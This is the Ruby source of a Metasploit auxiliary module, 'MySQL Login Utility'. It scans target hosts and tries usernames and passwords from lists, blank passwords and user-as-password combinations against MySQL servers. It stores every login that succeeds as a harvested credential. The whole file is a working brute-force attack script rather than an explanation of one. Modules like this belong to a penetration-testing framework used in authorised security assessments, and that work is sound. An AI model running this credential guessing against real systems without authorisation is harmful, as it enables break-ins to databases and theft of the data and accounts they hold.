##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mysql'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'			=> 'MySQL Login Utility',
      'Description'	=> 'This module simply queries the MySQL instance for a specific user/pass (default is root with blank).',
      'Author'		=> [ 'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>' ],
      'License'		=> MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ]
    ))
  end

  def target
    [rhost,rport].join(":")
  end


  def run_host(ip)
    begin
      if mysql_version_check("4.1.1") # Pushing down to 4.1.1.
        cred_collection = Metasploit::Framework::CredentialCollection.new(
            blank_passwords: datastore['BLANK_PASSWORDS'],
            pass_file: datastore['PASS_FILE'],
            password: datastore['PASSWORD'],
            user_file: datastore['USER_FILE'],
            userpass_file: datastore['USERPASS_FILE'],
            username: datastore['USERNAME'],
            user_as_pass: datastore['USER_AS_PASS'],
        )

        scanner = Metasploit::Framework::LoginScanner::MySQL.new(
            host: ip,
            port: rport,
            proxies: datastore['PROXIES'],
            cred_details: cred_collection,
            stop_on_success: datastore['STOP_ON_SUCCESS'],
            connection_timeout: 30
        )

        service_data = {
            address: ip,
            port: rport,
            service_name: 'mysql',
            protocol: 'tcp',
            workspace_id: myworkspace_id
        }

        scanner.scan! do |result|
          if result.success?
            credential_data = {
                module_fullname: self.fullname,
                origin_type: :service,
                private_data: result.credential.private,
                private_type: :password,
                username: result.credential.public
            }
            credential_data.merge!(service_data)

            credential_core = create_credential(credential_data)

            login_data = {
                core: credential_core,
                last_attempted_at: DateTime.now,
                status: Metasploit::Model::Login::Status::SUCCESSFUL
            }
            login_data.merge!(service_data)

            create_credential_login(login_data)
            print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
          else
            invalidate_login(
                address: ip,
                port: rport,
                protocol: 'tcp',
                public: result.credential.public,
                private: result.credential.private,
                realm_key: nil,
                realm_value: nil,
                status: result.status)
            print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
          end
        end

      else
        print_error "#{target} - Unsupported target version of MySQL detected. Skipping."
      end
    rescue ::Rex::ConnectionError, ::EOFError => e
      print_error "#{target} - Unable to connect: #{e.to_s}"
    end
  end

  # Tmtm's rbmysql is only good for recent versions of mysql, according
  # to http://www.tmtm.org/en/mysql/ruby/. We'll need to write our own
  # auth checker for earlier versions. Shouldn't be too hard.
  # This code is essentially the same as the mysql_version module, just less
  # whitespace and returns false on errors.
  def mysql_version_check(target="5.0.67") # Oldest the library claims.
    begin
      s = connect(false)
      data = s.get
      disconnect(s)
    rescue ::Rex::ConnectionError, ::EOFError => e
      raise e
    rescue ::Exception => e
      vprint_error("#{rhost}:#{rport} error checking version #{e.class} #{e}")
      return false
    end
    offset = 0
    l0, l1, l2 = data[offset, 3].unpack('CCC')
    return false if data.length < 3
    length = l0 | (l1 << 8) | (l2 << 16)
    # Read a bad amount of data
    return if length != (data.length - 4)
    offset += 4
    proto = data[offset, 1].unpack('C')[0]
    # Error condition
    return if proto == 255
    offset += 1
    version = data[offset..-1].unpack('Z*')[0]
    report_service(:host => rhost, :port => rport, :name => "mysql", :info => version)
    short_version = version.split('-')[0]
    vprint_status "#{rhost}:#{rport} - Found remote MySQL version #{short_version}"
    int_version(short_version) >= int_version(target)
  end

  # Takes a x.y.z version number and turns it into an integer for
  # easier comparison. Useful for other things probably so should
  # get moved up to Rex. Allows for version increments up to 0xff.
  def int_version(str)
    int = 0
    begin # Okay, if you're not exactly what I expect, just return 0
      return 0 unless str =~ /^[0-9]+\x2e[0-9]+/
      digits = str.split(".")[0,3].map {|x| x.to_i}
      digits[2] ||= 0 # Nil protection
      int =  (digits[0] << 16)
      int += (digits[1] << 8)
      int += digits[2]
    rescue
      return int
    end
  end



end
